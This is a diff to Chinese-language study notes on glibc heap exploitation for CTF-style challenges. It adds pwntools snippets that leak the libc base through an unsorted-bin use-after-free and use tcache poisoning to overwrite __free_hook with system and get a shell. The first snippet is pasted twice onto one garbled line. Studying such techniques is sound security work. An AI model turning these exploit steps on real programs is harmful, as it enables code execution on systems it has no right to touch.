@@ -252,6 +252,50 @@ int main()
 1. 通过unsorted bin uaf来泄露glibc地址
 2. fastbin修改到got或者 `__free_hook` 或者`__malloc_hook` 来getshell
 
+```c
+add(2, 0x100, '2')
+# 申请0x10防止在free 0x100的时候该chunk与top chunk合并
+add(3, 0x10, 'protect')
+free(2)
+add(2, 0x30, 'aaaaaaaa')
+# 这里也可以不用申请一个chunk，毕竟有UAF，可以直接show
+show(2)
+libc = ELF(libc_path)
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 344 - 0x10 - libc.sym['__malloc_hook']
+__malloc_hook = libc_base + libc.sym['__malloc_hook']
+success("libc:{}".format(hex(libc_base)))add(2, 0x100, '2') # 申请0x10防止在free 0x100的时候该chunk与top chunk合并 add(3, 0x10, 'protect') free(2) add(2, 0x30, 'aaaaaaaa') # 这里也可以不用申请一个chunk，毕竟有UAF，可以直接show show(2) libc = ELF(libc_path) libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00')) - 344 - 0x10 - libc.sym['__malloc_hook'] __malloc_hook = libc_base + libc.sym['__malloc_hook'] success("libc:{}".format(hex(libc_base)))
+```
+
 ### 2.27
 1. 额外增加了tcache机制，甚至不需要伪造size了
-2. 主义
+2. 注意count的问题
+
+```python
+message = "======================== LEAK HEAP ADDRESS ======================"
+success(message)
+for i in range(7):
+    add(i, 0x80, 'a')
+
+add(7, 0x80, 'b')
+
+for i in range(7):
+    free(i)
+
+add(8, 0x10, 'protected')
+free(7)
+add(8, 0x40, '\n')
+show(8)
+libc = ELF(libc_path)
+libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 138 - 0x10 - libc.sym['__malloc_hook']
+log.success("LIBC:" + hex(libc_base))
+__free_hook = libc_base + libc.sym['__free_hook']
+message = "======================== TCACHE ATTACK ========================"
+success(message)
+system = libc_base + libc.sym['system']
+edit(6, p64(__free_hook))
+
+add(0, 0x80, 'hacker')
+add(0, 0x80, p64(system))
+add(0, 0x10, '/bin/sh\x00')
+free(0)
+```
